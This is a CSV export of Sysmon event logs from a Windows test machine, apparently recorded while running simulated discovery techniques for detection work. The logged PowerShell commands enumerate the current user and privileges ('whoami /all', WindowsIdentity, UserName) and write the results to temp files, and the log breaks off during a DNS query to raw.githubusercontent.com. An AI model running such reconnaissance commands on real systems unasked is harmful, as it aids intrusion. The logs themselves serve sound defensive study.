Channel,CommandLine,Company,Computer,CreationUtcTime,CurrentDirectory,Description,DestinationHostname,DestinationIp,DestinationIsIpv6,DestinationPort,DestinationPortName,EventID,EventRecordID,FileVersion,Hashes,Image,Initiated,IntegrityLevel,Keywords,Level,LogonGuid,LogonId,Opcode,OriginalFileName,ParentCommandLine,ParentImage,ParentProcessGuid,ParentProcessId,ParentUser,ProcessGuid,ProcessID,ProcessId,Product,Protocol,QueryName,QueryResults,QueryStatus,RuleName,SourceHostname,SourceIp,SourceIsIpv6,SourcePort,SourcePortName,SystemTime,TargetFilename,Task,TerminalSessionId,ThreadID,User,UserID,UtcTime,Version,raw
Microsoft-Windows-Sysmon/Operational,taskhostw.exe,Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Host Process for Windows Tasks,,,,,,1,19686,10.0.22621.2792 (WinBuild.160101.0800),"
        MD5=AAA6BA42398B2D70F12F00A110701041,SHA256=58CC5757BB129557652797EA92AEE701DE5C574B22FDCD5DCDDF141CAEEA3C02,IMPHASH=1C4E2D9936E4D9F2490B08AAB4D24260",C:\Windows\System32\taskhostw.exe,,System,0x8000000000000000,4,{f57bd86a-36f5-658c-e703-000000000000},0x3e7,0,taskhostw.exe,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,C:\Windows\System32\svchost.exe,{f57bd86a-36f6-658c-1d00-000000000f00},1496,NT AUTHORITY\SYSTEM,{f57bd86a-616d-658c-7002-000000000f00},3588,5868,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T17:39:57.5862169Z,,1,0,5124,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-27 17:39:57.584,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
    
    <System>
      
      
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
      
      <EventID>1</EventID>
      
      
      <Version>5</Version>
      
      
      <Level>4</Level>
      
      
      <Task>1</Task>
      
      
      <Opcode>0</Opcode>
      
      
      <Keywords>0x8000000000000000</Keywords>
      
      
      <TimeCreated SystemTime=""2023-12-27T17:39:57.5862169Z""/>
      
      
      <EventRecordID>19686</EventRecordID>
      
      
      <Correlation/>
      
      
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
      
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
      
      <Computer>WinDev2309Eval</Computer>
      
      
      <Security UserID=""S-1-5-18""/>
      
    
    </System>
    
    
    <EventData>
      
      
      <Data Name=""RuleName"">-</Data>
      
      
      <Data Name=""UtcTime"">2023-12-27 17:39:57.584</Data>
      
      
      <Data Name=""ProcessGuid"">{f57bd86a-616d-658c-7002-000000000f00}</Data>
      
      
      <Data Name=""ProcessId"">5868</Data>
      
      
      <Data Name=""Image"">C:\Windows\System32\taskhostw.exe</Data>
      
      
      <Data Name=""FileVersion"">10.0.22621.2792 (WinBuild.160101.0800)</Data>
      
      
      <Data Name=""Description"">Host Process for Windows Tasks</Data>
      
      
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
      
      <Data Name=""Company"">Microsoft Corporation</Data>
      
      
      <Data Name=""OriginalFileName"">taskhostw.exe</Data>
      
      
      <Data Name=""CommandLine"">taskhostw.exe</Data>
      
      
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      
      
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      
      
      <Data Name=""LogonGuid"">{f57bd86a-36f5-658c-e703-000000000000}</Data>
      
      
      <Data Name=""LogonId"">0x3e7</Data>
      
      
      <Data Name=""TerminalSessionId"">0</Data>
      
      
      <Data Name=""IntegrityLevel"">System</Data>
      
      
      <Data Name=""Hashes"">
        MD5=AAA6BA42398B2D70F12F00A110701041,SHA256=58CC5757BB129557652797EA92AEE701DE5C574B22FDCD5DCDDF141CAEEA3C02,IMPHASH=1C4E2D9936E4D9F2490B08AAB4D24260</Data>
      
      
      <Data Name=""ParentProcessGuid"">{f57bd86a-36f6-658c-1d00-000000000f00}</Data>
      
      
      <Data Name=""ParentProcessId"">1496</Data>
      
      
      <Data Name=""ParentImage"">C:\Windows\System32\svchost.exe</Data>
      
      
      <Data Name=""ParentCommandLine"">C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule</Data>
      
      
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
      
    
    </EventData>
    
  
  </Event>
  
  
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\whoami.exe"" /all",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,whoami - displays logged on user information,,,,,,1,19685,10.0.22621.1 (WinBuild.160101.0800),"
        MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292",C:\Windows\System32\whoami.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,whoami.exe,"""powershell.exe"" & {$TokenSet = @{
        U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        N = [Char[]]'0123456789'
        }
        $Upper = Get-Random -Count 5 -InputObject $TokenSet.U
        $Number = Get-Random -Count 5 -InputObject $TokenSet.N
        $StringSet = $Upper + $Number
        $rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''
        $file = \""""rad\"""" + $rad + \"""".tmp\""""

        whoami.exe /all >> $env:temp\$file}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-614b-658c-6d02-000000000f00},10564,WINDEV2309EVAL\User,{f57bd86a-614c-658c-6f02-000000000f00},3588,10552,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T17:39:24.4586543Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 17:39:24.457,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
    
    <System>
      
      
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
      
      <EventID>1</EventID>
      
      
      <Version>5</Version>
      
      
      <Level>4</Level>
      
      
      <Task>1</Task>
      
      
      <Opcode>0</Opcode>
      
      
      <Keywords>0x8000000000000000</Keywords>
      
      
      <TimeCreated SystemTime=""2023-12-27T17:39:24.4586543Z""/>
      
      
      <EventRecordID>19685</EventRecordID>
      
      
      <Correlation/>
      
      
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
      
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
      
      <Computer>WinDev2309Eval</Computer>
      
      
      <Security UserID=""S-1-5-18""/>
      
    
    </System>
    
    
    <EventData>
      
      
      <Data Name=""RuleName"">-</Data>
      
      
      <Data Name=""UtcTime"">2023-12-27 17:39:24.457</Data>
      
      
      <Data Name=""ProcessGuid"">{f57bd86a-614c-658c-6f02-000000000f00}</Data>
      
      
      <Data Name=""ProcessId"">10552</Data>
      
      
      <Data Name=""Image"">C:\Windows\System32\whoami.exe</Data>
      
      
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      
      
      <Data Name=""Description"">whoami - displays logged on user information</Data>
      
      
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
      
      <Data Name=""Company"">Microsoft Corporation</Data>
      
      
      <Data Name=""OriginalFileName"">whoami.exe</Data>
      
      
      <Data Name=""CommandLine"">""C:\Windows\system32\whoami.exe"" /all</Data>
      
      
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
      
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
      
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
      
      <Data Name=""LogonId"">0x2f87b</Data>
      
      
      <Data Name=""TerminalSessionId"">1</Data>
      
      
      <Data Name=""IntegrityLevel"">Medium</Data>
      
      
      <Data Name=""Hashes"">
        MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292</Data>
      
      
      <Data Name=""ParentProcessGuid"">{f57bd86a-614b-658c-6d02-000000000f00}</Data>
      
      
      <Data Name=""ParentProcessId"">10564</Data>
      
      
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
      
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {$TokenSet = @{
        U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        N = [Char[]]'0123456789'
        }
        $Upper = Get-Random -Count 5 -InputObject $TokenSet.U
        $Number = Get-Random -Count 5 -InputObject $TokenSet.N
        $StringSet = $Upper + $Number
        $rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''
        $file = \""""rad\"""" + $rad + \"""".tmp\""""

        whoami.exe /all &gt;&gt; $env:temp\$file}</Data>
      
      
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
      
    
    </EventData>
    
  
  </Event>
  
  
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 17:39:23.498,,,,,,,,11,19684,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-614b-658c-6d02-000000000f00},3588,10564,,,,,,-,,,,,,2023-12-27T17:39:23.5067486Z,"
        C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_zljo04tx.ane.ps1",11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 17:39:23.498,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
    
    <System>
      
      
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
      
      <EventID>11</EventID>
      
      
      <Version>2</Version>
      
      
      <Level>4</Level>
      
      
      <Task>11</Task>
      
      
      <Opcode>0</Opcode>
      
      
      <Keywords>0x8000000000000000</Keywords>
      
      
      <TimeCreated SystemTime=""2023-12-27T17:39:23.5067486Z""/>
      
      
      <EventRecordID>19684</EventRecordID>
      
      
      <Correlation/>
      
      
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
      
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
      
      <Computer>WinDev2309Eval</Computer>
      
      
      <Security UserID=""S-1-5-18""/>
      
    
    </System>
    
    
    <EventData>
      
      
      <Data Name=""RuleName"">-</Data>
      
      
      <Data Name=""UtcTime"">2023-12-27 17:39:23.498</Data>
      
      
      <Data Name=""ProcessGuid"">{f57bd86a-614b-658c-6d02-000000000f00}</Data>
      
      
      <Data Name=""ProcessId"">10564</Data>
      
      
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
      
      <Data Name=""TargetFilename"">
        C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_zljo04tx.ane.ps1</Data>
      
      
      <Data Name=""CreationUtcTime"">2023-12-27 17:39:23.498</Data>
      
      
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
    
    </EventData>
    
  
  </Event>
  
  
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {$TokenSet = @{
        U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        N = [Char[]]'0123456789'
        }
        $Upper = Get-Random -Count 5 -InputObject $TokenSet.U
        $Number = Get-Random -Count 5 -InputObject $TokenSet.N
        $StringSet = $Upper + $Number
        $rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''
        $file = \""""rad\"""" + $rad + \"""".tmp\""""

        whoami.exe /all >> $env:temp\$file}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19683,10.0.22621.2506 (WinBuild.160101.0800),"
        MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-614b-658c-6d02-000000000f00},3588,10564,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T17:39:23.4010891Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 17:39:23.400,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
    
    <System>
      
      
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
      
      <EventID>1</EventID>
      
      
      <Version>5</Version>
      
      
      <Level>4</Level>
      
      
      <Task>1</Task>
      
      
      <Opcode>0</Opcode>
      
      
      <Keywords>0x8000000000000000</Keywords>
      
      
      <TimeCreated SystemTime=""2023-12-27T17:39:23.4010891Z""/>
      
      
      <EventRecordID>19683</EventRecordID>
      
      
      <Correlation/>
      
      
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
      
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
      
      <Computer>WinDev2309Eval</Computer>
      
      
      <Security UserID=""S-1-5-18""/>
      
    
    </System>
    
    
    <EventData>
      
      
      <Data Name=""RuleName"">-</Data>
      
      
      <Data Name=""UtcTime"">2023-12-27 17:39:23.400</Data>
      
      
      <Data Name=""ProcessGuid"">{f57bd86a-614b-658c-6d02-000000000f00}</Data>
      
      
      <Data Name=""ProcessId"">10564</Data>
      
      
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
      
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
      
      <Data Name=""Description"">Windows PowerShell</Data>
      
      
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
      
      <Data Name=""Company"">Microsoft Corporation</Data>
      
      
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
      
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {$TokenSet = @{
        U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        N = [Char[]]'0123456789'
        }
        $Upper = Get-Random -Count 5 -InputObject $TokenSet.U
        $Number = Get-Random -Count 5 -InputObject $TokenSet.N
        $StringSet = $Upper + $Number
        $rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''
        $file = \""""rad\"""" + $rad + \"""".tmp\""""

        whoami.exe /all &gt;&gt; $env:temp\$file}</Data>
      
      
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
      
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
      
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
      
      <Data Name=""LogonId"">0x2f87b</Data>
      
      
      <Data Name=""TerminalSessionId"">1</Data>
      
      
      <Data Name=""IntegrityLevel"">Medium</Data>
      
      
      <Data Name=""Hashes"">
        MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
      
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
      
      <Data Name=""ParentProcessId"">1688</Data>
      
      
      <Data Name=""ParentImage"">-</Data>
      
      
      <Data Name=""ParentCommandLine"">-</Data>
      
      
      <Data Name=""ParentUser"">-</Data>
      
    
    </EventData>
    
  
  </Event>
  
  
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 17:39:22.226,,,,,,,,11,19682,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-614a-658c-6b02-000000000f00},3588,1156,,,,,,-,,,,,,2023-12-27T17:39:22.2307599Z,"
        C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_1ngwliwd.pks.ps1",11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 17:39:22.226,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
    
    <System>
      
      
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
      
      <EventID>11</EventID>
      
      
      <Version>2</Version>
      
      
      <Level>4</Level>
      
      
      <Task>11</Task>
      
      
      <Opcode>0</Opcode>
      
      
      <Keywords>0x8000000000000000</Keywords>
      
      
      <TimeCreated SystemTime=""2023-12-27T17:39:22.2307599Z""/>
      
      
      <EventRecordID>19682</EventRecordID>
      
      
      <Correlation/>
      
      
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
      
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
      
      <Computer>WinDev2309Eval</Computer>
      
      
      <Security UserID=""S-1-5-18""/>
      
    
    </System>
    
    
    <EventData>
      
      
      <Data Name=""RuleName"">-</Data>
      
      
      <Data Name=""UtcTime"">2023-12-27 17:39:22.226</Data>
      
      
      <Data Name=""ProcessGuid"">{f57bd86a-614a-658c-6b02-000000000f00}</Data>
      
      
      <Data Name=""ProcessId"">1156</Data>
      
      
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
      
      <Data Name=""TargetFilename"">
        C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_1ngwliwd.pks.ps1</Data>
      
      
      <Data Name=""CreationUtcTime"">2023-12-27 17:39:22.226</Data>
      
      
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
    
    </EventData>
    
  
  </Event>
  
  
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" &
        {[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath
        .\CurrentUserObject.txt}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19681,10.0.22621.2506 (WinBuild.160101.0800),"
        MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-614a-658c-6b02-000000000f00},3588,1156,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T17:39:22.1236644Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 17:39:22.122,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
    
    <System>
      
      
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
      
      <EventID>1</EventID>
      
      
      <Version>5</Version>
      
      
      <Level>4</Level>
      
      
      <Task>1</Task>
      
      
      <Opcode>0</Opcode>
      
      
      <Keywords>0x8000000000000000</Keywords>
      
      
      <TimeCreated SystemTime=""2023-12-27T17:39:22.1236644Z""/>
      
      
      <EventRecordID>19681</EventRecordID>
      
      
      <Correlation/>
      
      
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
      
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
      
      <Computer>WinDev2309Eval</Computer>
      
      
      <Security UserID=""S-1-5-18""/>
      
    
    </System>
    
    
    <EventData>
      
      
      <Data Name=""RuleName"">-</Data>
      
      
      <Data Name=""UtcTime"">2023-12-27 17:39:22.122</Data>
      
      
      <Data Name=""ProcessGuid"">{f57bd86a-614a-658c-6b02-000000000f00}</Data>
      
      
      <Data Name=""ProcessId"">1156</Data>
      
      
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
      
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
      
      <Data Name=""Description"">Windows PowerShell</Data>
      
      
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
      
      <Data Name=""Company"">Microsoft Corporation</Data>
      
      
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
      
      <Data Name=""CommandLine"">""powershell.exe"" &amp;
        {[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath
        .\CurrentUserObject.txt}</Data>
      
      
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
      
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
      
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
      
      <Data Name=""LogonId"">0x2f87b</Data>
      
      
      <Data Name=""TerminalSessionId"">1</Data>
      
      
      <Data Name=""IntegrityLevel"">Medium</Data>
      
      
      <Data Name=""Hashes"">
        MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
      
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
      
      <Data Name=""ParentProcessId"">1688</Data>
      
      
      <Data Name=""ParentImage"">-</Data>
      
      
      <Data Name=""ParentCommandLine"">-</Data>
      
      
      <Data Name=""ParentUser"">-</Data>
      
    
    </EventData>
    
  
  </Event>
  
  
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 17:39:20.974,,,,,,,,11,19680,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-6148-658c-6902-000000000f00},3588,10072,,,,,,-,,,,,,2023-12-27T17:39:20.9906991Z,"
        C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_bljvgppx.os5.ps1",11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 17:39:20.974,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
    
    <System>
      
      
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
      
      <EventID>11</EventID>
      
      
      <Version>2</Version>
      
      
      <Level>4</Level>
      
      
      <Task>11</Task>
      
      
      <Opcode>0</Opcode>
      
      
      <Keywords>0x8000000000000000</Keywords>
      
      
      <TimeCreated SystemTime=""2023-12-27T17:39:20.9906991Z""/>
      
      
      <EventRecordID>19680</EventRecordID>
      
      
      <Correlation/>
      
      
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
      
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
      
      <Computer>WinDev2309Eval</Computer>
      
      
      <Security UserID=""S-1-5-18""/>
      
    
    </System>
    
    
    <EventData>
      
      
      <Data Name=""RuleName"">-</Data>
      
      
      <Data Name=""UtcTime"">2023-12-27 17:39:20.974</Data>
      
      
      <Data Name=""ProcessGuid"">{f57bd86a-6148-658c-6902-000000000f00}</Data>
      
      
      <Data Name=""ProcessId"">10072</Data>
      
      
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
      
      <Data Name=""TargetFilename"">
        C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_bljvgppx.os5.ps1</Data>
      
      
      <Data Name=""CreationUtcTime"">2023-12-27 17:39:20.974</Data>
      
      
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
    
    </EventData>
    
  
  </Event>
  
  
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {[System.Environment]::UserName | Out-File
        -FilePath .\CurrentactiveUser.txt
        $env:UserName | Out-File -FilePath .\CurrentactiveUser.txt -Append}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19679,10.0.22621.2506 (WinBuild.160101.0800),"
        MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-6148-658c-6902-000000000f00},3588,10072,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T17:39:20.8851140Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 17:39:20.884,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
    
    <System>
      
      
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
      
      <EventID>1</EventID>
      
      
      <Version>5</Version>
      
      
      <Level>4</Level>
      
      
      <Task>1</Task>
      
      
      <Opcode>0</Opcode>
      
      
      <Keywords>0x8000000000000000</Keywords>
      
      
      <TimeCreated SystemTime=""2023-12-27T17:39:20.8851140Z""/>
      
      
      <EventRecordID>19679</EventRecordID>
      
      
      <Correlation/>
      
      
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
      
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
      
      <Computer>WinDev2309Eval</Computer>
      
      
      <Security UserID=""S-1-5-18""/>
      
    
    </System>
    
    
    <EventData>
      
      
      <Data Name=""RuleName"">-</Data>
      
      
      <Data Name=""UtcTime"">2023-12-27 17:39:20.884</Data>
      
      
      <Data Name=""ProcessGuid"">{f57bd86a-6148-658c-6902-000000000f00}</Data>
      
      
      <Data Name=""ProcessId"">10072</Data>
      
      
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
      
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
      
      <Data Name=""Description"">Windows PowerShell</Data>
      
      
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
      
      <Data Name=""Company"">Microsoft Corporation</Data>
      
      
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
      
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {[System.Environment]::UserName | Out-File
        -FilePath .\CurrentactiveUser.txt
        $env:UserName | Out-File -FilePath .\CurrentactiveUser.txt -Append}</Data>
      
      
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
      
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
      
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
      
      <Data Name=""LogonId"">0x2f87b</Data>
      
      
      <Data Name=""TerminalSessionId"">1</Data>
      
      
      <Data Name=""IntegrityLevel"">Medium</Data>
      
      
      <Data Name=""Hashes"">
        MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
      
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
      
      <Data Name=""ParentProcessId"">1688</Data>
      
      
      <Data Name=""ParentImage"">-</Data>
      
      
      <Data Name=""ParentCommandLine"">-</Data>
      
      
      <Data Name=""ParentUser"">-</Data>
      
    
    </EventData>
    
  
  </Event>
  
  
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,22,19678,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-6143-658c-6702-000000000f00},3588,10824,,,raw.githubusercontent.com,"
        ::ffff:185.199.108.133;::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.110.133;",0,-,,,,,,2023-12-27T17:39:19.5524395Z,,22,,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:01:27.326,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
    
    <System>
      
      
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
      
      <EventID>22</EventID>
      
      
      <Version>5</Version>
      
      
      <Level>4</Level>
      
      
      <Task>22</Task>
      
      
      <Opcode>0</Opcode>
      
      
      <Keywords>0x8000000000000000</Keywords>
      
      
      <TimeCreated SystemTime=""2023-12-27T17:39:19.5524395Z""/>
      
      
      <EventRecordID>19678</EventRecordID>
      
      
      <Correlation/>
      
      
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      
      
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
      
      <Computer>WinDev2309Eval</Computer>
      
      
      <Security UserID=""S-1-5-18""/>
      
    
    </System>
    
    
    <EventData>
      
      
      <Data Name=""RuleName"">-</Data>
      
      
      <Data Name=""UtcTime"">2023-12-27 15:01:27.326</Data>
      
      
      <Data Name=""ProcessGuid"">{f57bd86a-6143-658c-6702-000000000f00}</Data>
      
      
      <Data Name=""ProcessId"">10824</Data>
      
      
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      
      
      <Data Name=""QueryStatus"">0</Data>
      
